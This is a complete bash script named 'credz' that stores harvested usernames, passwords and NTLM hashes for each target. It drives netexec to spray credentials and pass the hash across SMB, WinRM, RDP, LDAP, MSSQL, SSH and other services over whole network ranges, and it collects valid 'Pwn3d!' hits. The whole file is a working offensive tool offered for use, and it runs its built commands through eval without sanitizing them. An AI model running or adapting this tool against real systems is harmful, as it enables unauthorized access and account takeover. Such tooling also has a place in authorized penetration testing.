#!/bin/bash
# credz - Per-target credential storage & spray tool
# Storage: ~/.credz/<target>/{userz,hashez,passwordz}
# 0xScorpio

# ══════════════════════════════════════════════════════════════
# CONFIG
# ══════════════════════════════════════════════════════════════

CREDZ_DIR="$HOME/.credz"

TYPES=(user pass hash)
declare -A FNAMES=([user]=userz [pass]=passwordz [hash]=hashez)
declare -A LABELS=([user]=User [pass]=Password [hash]=Hash)

SPRAY_AD_PROTOS=(smb winrm wmi rdp ldap mssql)
SPRAY_W_PROTOS=(smb rdp winrm mssql vnc)
SPRAY_L_PROTOS=(ssh ftp smb vnc rdp)
declare -A SPRAY_PORTS=([smb]=445 [winrm]=5985,5986 [wmi]=135 [rdp]=3389 [ldap]=389,636 [mssql]=1433 [ssh]=22 [ftp]=21 [vnc]=5900)
declare -A PTH_OK=([smb]=1 [winrm]=1 [wmi]=1 [ldap]=1 [mssql]=1)

# ══════════════════════════════════════════════════════════════
# ANSI
# ══════════════════════════════════════════════════════════════

BD=$'\033[1m' BL=$'\033[5m' X=$'\033[0m'
R=$'\033[91m' G=$'\033[92m' Y=$'\033[93m' B=$'\033[94m'
M=$'\033[95m' CY=$'\033[96m' W=$'\033[97m'

# ══════════════════════════════════════════════════════════════
# USAGE
# ══════════════════════════════════════════════════════════════

usage() {
    cat <<EOF
${M}                      __
  _____________  ____/ /___
 / ___/ ___/ _ \/ __  /_  /
/ /__/ /  /  __/ /_/ / / /_
\___/_/   \___/\__,_/ /___/${X}

${BD}Usage:${X}
  credz <target> user|pass|hash <val> [val...]
  credz <target> userlist|passlist|hashlist <file>
  credz <target> copy|clear|print [user|pass|hash]
  credz clear
  credz <target> spray-ad|spray-w|spray-l <IP/CIDR> [-d domain] [-o dir]
  credz show [target] [user|pass|hash]

${BD}Actions:${X}
  user      Append usernames          pass      Append passwords
  hash      Append hashes             copy      Copy cred files to cwd
  userlist  Import users from file    passlist  Import passwords from file
  hashlist  Import hashes from file   print     Print stored credentials
  clear     Clear creds (or ${W}credz clear${X} to wipe everything)
  show      Tree view of ~/.credz
  spray-ad  Spray AD targets          ${W}smb winrm wmi rdp ldap mssql${X}
  spray-w   Spray Windows targets     ${W}smb rdp winrm mssql vnc${X}
  spray-l   Spray Linux targets       ${W}ssh ftp smb vnc rdp${X}

${BD}Spray options:${X}
  -d, --domain <domain>       Domain for authentication
  -o, --output <dir>          Output dir (default: ./spray-results)

  Passwords are sprayed first (full cartesian), then hashes (PtH)
  where supported. All protocols for the mode are always used.

${BD}Examples:${X}
  credz dc01 user admin svc_backup       ${W}# store users${X}
  credz dc01 pass 'P@ss!' 'Summer2025'   ${W}# store passwords${X}
  credz dc01 hash 'aad3b435...:31d6cf...'${W}# store NTLM hash${X}
  credz dc01 print                        ${W}# print all cred types${X}
  credz dc01 print user                   ${W}# print just users${X}
  credz dc01 copy                         ${W}# copy files to cwd${X}
  credz dc01 clear pass                   ${W}# clear passwords only${X}
  credz show                              ${W}# tree of all targets${X}
  credz show dc01                         ${W}# tree of dc01 creds${X}
  credz dc01 spray-ad 10.10.10.0/24      ${W}# spray all AD protos${X}
  credz dc01 spray-ad 10.0.0.0/8 -d corp.local
  credz websvr spray-w 192.168.1.50      ${W}# spray Windows protos${X}
  credz target spray-l 10.10.10.5        ${W}# spray Linux protos${X}
  credz target spray-l 172.16.0.0/16 -o /tmp/results
  credz dc01 userlist /usr/share/seclists/Usernames/top-users.txt
  credz dc01 passlist rockyou.txt        ${W}# import password wordlist${X}
  credz dc01 hashlist dumped_hashes.txt  ${W}# import hash list${X}
EOF
    exit 1
}

# ══════════════════════════════════════════════════════════════
# CREDENTIAL STORAGE
# ══════════════════════════════════════════════════════════════

fpath()       { echo "$CREDZ_DIR/$1/${FNAMES[$2]}"; }
init_target() { mkdir -p "$CREDZ_DIR/$1"; for t in "${TYPES[@]}"; do touch "$CREDZ_DIR/$1/${FNAMES[$t]}"; done; }

for_types() {
    local target=$1 filter=$2 cb=$3
    if [[ -n "$filter" && -v "FNAMES[$filter]" ]]; then $cb "$target" "$filter"
    else for t in "${TYPES[@]}"; do $cb "$target" "$t"; done; fi
}

_append() { echo "$3" >> "$(fpath "$1" "$2")"; echo "${G}[+]${X} ${LABELS[$2]} added: $3 ($1)"; }

_import() {
    local target=$1 type=$2 file=$3
    local dest; dest=$(fpath "$target" "$type")
    [[ ! -f "$file" ]] && { echo "${R}[-]${X} File not found: $file"; exit 1; }
    local before; before=$(wc -l < "$dest")
    cat "$file" >> "$dest"
    sort -u -o "$dest" "$dest"
    local after; after=$(wc -l < "$dest")
    local added=$((after - before))
    echo "${G}[+]${X} Imported $added new ${LABELS[$type],,}(s) from $file ($target) [total: $after]"
}
_copy()   { cp "$(fpath "$1" "$2")" "./${FNAMES[$2]}"; echo "${G}[+]${X} Copied ${FNAMES[$2]} -> ./${FNAMES[$2]} ($1)"; }
_clear()  { > "$(fpath "$1" "$2")"; echo "${Y}[*]${X} Cleared ${FNAMES[$2]} ($1)"; }
_print()  { echo "=== $1 / ${LABELS[$2]}s (${FNAMES[$2]}) ==="; cat "$(fpath "$1" "$2")" 2>/dev/null; echo; }

do_show() {
    [[ ! -d "$CREDZ_DIR" ]] && { echo "${R}[-]${X} No credz data yet"; exit 1; }
    local dir="$CREDZ_DIR/$1"
    [[ -z "$1" ]] && dir="$CREDZ_DIR"
    [[ -n "$1" && ! -d "$dir" ]] && { echo "${R}[-]${X} No data for: $1"; exit 1; }
    [[ -n "$2" && -v "FNAMES[$2]" ]] && { _print "$1" "$2"; return; }
    if command -v tree &>/dev/null; then tree "$dir" --noreport
    else find "$dir" -type f | sort | while read -r f; do echo "${f#$CREDZ_DIR/} ($(wc -l < "$f") entries)"; done; fi
}

# ══════════════════════════════════════════════════════════════
# SPRAY — Dashboard
# ══════════════════════════════════════════════════════════════

BOX_W=72
BOX_LINE=$(printf '═%.0s' $(seq 1 $BOX_W))

_box_top()  { echo "${CY}╔${BOX_LINE}╗${X}"; }
_box_mid()  { echo "${CY}╠${BOX_LINE}╣${X}"; }
_box_bot()  { echo "${CY}╚${BOX_LINE}╝${X}"; }
_box_row()  { echo -e "${CY}║${X} $1"; }
_box_head() { printf "${CY}║${X}${BD}%*s${X}${CY}║${X}\n" $(( (BOX_W + ${#1}) / 2 )) "$1"; }

_elapsed() { printf '%02d:%02d:%02d' $((SECONDS/3600)) $(((SECONDS%3600)/60)) $((SECONDS%60)); }

_draw() {
    local target=$1 network=$2 elapsed=$3 done_n=0 i
    for s in "${_TST[@]}"; do [[ "$s" == done ]] && ((done_n++)) ||:; done

    printf '\033[2J\033[H'
    echo -e "${M}                      __"
    echo "  _____________  ____/ /___"
    echo " / ___/ ___/ _ \\/ __  /_  /"
    echo "/ /__/ /  /  __/ /_/ / / /_"
    echo -e "\\___/_/   \\___/\\__,_/ /___/${X}"
    echo ""
    echo "${B}[*]${X} Creds  : ${BD}$target${X}    Network : ${BD}$network${X}"
    [[ -n "$elapsed" ]] && echo "${B}[*]${X} Elapsed: $elapsed    Progress: ${done_n}/${#_TDESC[@]} tasks"
    echo ""

    _box_top; _box_head "EXECUTION PLAN"; _box_mid
    for i in "${!_TDESC[@]}"; do
        local st=${_TST[$i]} d=${_TDESC[$i]} c=${_TCMD[$i]}
        (( ${#c} > BOX_W - 8 )) && c="${c:0:$((BOX_W-11))}..."
        case $st in
            done)    _box_row "  ${G}✔ $d${X}";       _box_row "    ${G}$c${X}" ;;
            running) _box_row "  ${BL}${CY}▶ $d${X}"; _box_row "    ${BL}${CY}$c${X}" ;;
            *)       _box_row "  ${W}○ $d${X}";       _box_row "    ${W}$c${X}" ;;
        esac
    done
    _box_bot
}

# ══════════════════════════════════════════════════════════════
# SPRAY — Logic
# ══════════════════════════════════════════════════════════════

_build_cmd() {
    local proto=$1 flag=$2 file=$3
    local c="netexec $proto $_SPRAY_NET -u $_SPRAY_UF $flag $file --continue-on-success"
    [[ -n "$_SPRAY_DOM" ]] && c+=" -d $_SPRAY_DOM"
    echo "$c"
}

do_spray() {
    local mode=$1 target=$2; shift 2
    _SPRAY_NET=$1; shift
    [[ -z "$_SPRAY_NET" ]] && { echo "${R}[-]${X} Missing IP/CIDR"; usage; }

    _SPRAY_UF="$CREDZ_DIR/$target/${FNAMES[user]}"
    local pf="$CREDZ_DIR/$target/${FNAMES[pass]}"
    local hf="$CREDZ_DIR/$target/${FNAMES[hash]}"

    local protos=()
    case $mode in
        spray-ad) protos=("${SPRAY_AD_PROTOS[@]}") ;;
        spray-w)  protos=("${SPRAY_W_PROTOS[@]}") ;;
        spray-l)  protos=("${SPRAY_L_PROTOS[@]}") ;;
    esac
    _SPRAY_DOM=""
    local odir=./spray-results

    while [[ $# -gt 0 ]]; do
        case $1 in
            -d|--domain) _SPRAY_DOM=$2; shift 2 ;;
            -o|--output) odir=$2; shift 2 ;;
            *) echo "${R}[-]${X} Unknown: $1"; exit 1 ;;
        esac
    done

    # Validate
    command -v netexec &>/dev/null || { echo "${R}[-]${X} netexec not in PATH"; exit 1; }
    [[ -s "$_SPRAY_UF" ]]         || { echo "${R}[-]${X} No users in $_SPRAY_UF"; exit 1; }
    [[ -s "$pf" || -s "$hf" ]]    || { echo "${R}[-]${X} No passwords or hashes for '$target'"; exit 1; }

    # Build task list: passwords first, then hashes (PtH)
    mkdir -p "$odir"; > "$odir/valid_creds.txt"
    _TDESC=() _TCMD=() _TLOG=() _TST=()

    for proto in "${protos[@]}"; do
        [[ -s "$pf" ]] && { _TDESC+=("${proto^^} password spray (${SPRAY_PORTS[$proto]})"); _TCMD+=("$(_build_cmd "$proto" -p "$pf")"); _TLOG+=("$odir/${proto}_password.log"); _TST+=(pending); }
    done
    for proto in "${protos[@]}"; do
        [[ -s "$hf" ]] && [[ -v "PTH_OK[$proto]" ]] && { _TDESC+=("${proto^^} hash spray / PtH (${SPRAY_PORTS[$proto]})"); _TCMD+=("$(_build_cmd "$proto" -H "$hf")"); _TLOG+=("$odir/${proto}_hash.log"); _TST+=(pending); }
    done

    SECONDS=0

    # Execute with live dashboard
    for i in "${!_TCMD[@]}"; do
        _TST[$i]=running; _draw "$target" "$_SPRAY_NET" "$(_elapsed)"
        eval "${_TCMD[$i]}" > "${_TLOG[$i]}" 2>&1
        grep -E '\[\+\]|Pwn3d!' "${_TLOG[$i]}" >> "$odir/valid_creds.txt" 2>/dev/null ||:
        _TST[$i]=done
    done

    # Final results
    _draw "$target" "$_SPRAY_NET" "$(_elapsed)"
    echo ""; _box_top; _box_head "RESULTS"; _box_mid
    if [[ -s "$odir/valid_creds.txt" ]]; then
        _box_row "${G}${BD}VALID CREDENTIALS: $(wc -l < "$odir/valid_creds.txt") hit(s)${X}"
        _box_row ""
        while IFS= read -r hit; do _box_row "  ${G}$hit${X}"; done < "$odir/valid_creds.txt"
    else
        _box_row "${R}No valid credentials discovered${X}"
    fi
    _box_row ""; _box_row "${B}Full logs: $odir/${X}"; _box_bot
}

# ══════════════════════════════════════════════════════════════
# ENTRY POINT
# ══════════════════════════════════════════════════════════════

[[ $# -lt 1 ]] && usage
[[ "$1" == show ]] && { do_show "$2" "$3"; exit 0; }
[[ "$1" == clear && -z "$2" ]] && {
    [[ ! -d "$CREDZ_DIR" ]] && { echo "${R}[-]${X} Nothing to clear — $CREDZ_DIR does not exist"; exit 1; }
    rm -rf "$CREDZ_DIR"
    echo "${G}[+]${X} Wiped $CREDZ_DIR"
    exit 0
}

TARGET=$1 ACTION=$2
[[ -z "$ACTION" ]] && { echo "${R}[-]${X} Missing action. Run: credz"; exit 1; }
init_target "$TARGET"

case $ACTION in
    user|pass|hash) shift 2; [[ $# -lt 1 ]] && { echo "${R}[-]${X} Provide at least one ${LABELS[$ACTION],,}"; exit 1; }
                    for v in "$@"; do _append "$TARGET" "$ACTION" "$v"; done ;;
    userlist|passlist|hashlist)
                    [[ -z "$3" ]] && { echo "${R}[-]${X} Provide a file path"; exit 1; }
                    _import "$TARGET" "${ACTION%list}" "$3" ;;
    copy)           for_types "$TARGET" "$3" _copy  ;;
    clear)          for_types "$TARGET" "$3" _clear ;;
    print)          for_types "$TARGET" "$3" _print ;;
    spray-ad|spray-w|spray-l)
                    shift 2; do_spray "$ACTION" "$TARGET" "$@" ;;
    *)              usage ;;
esac
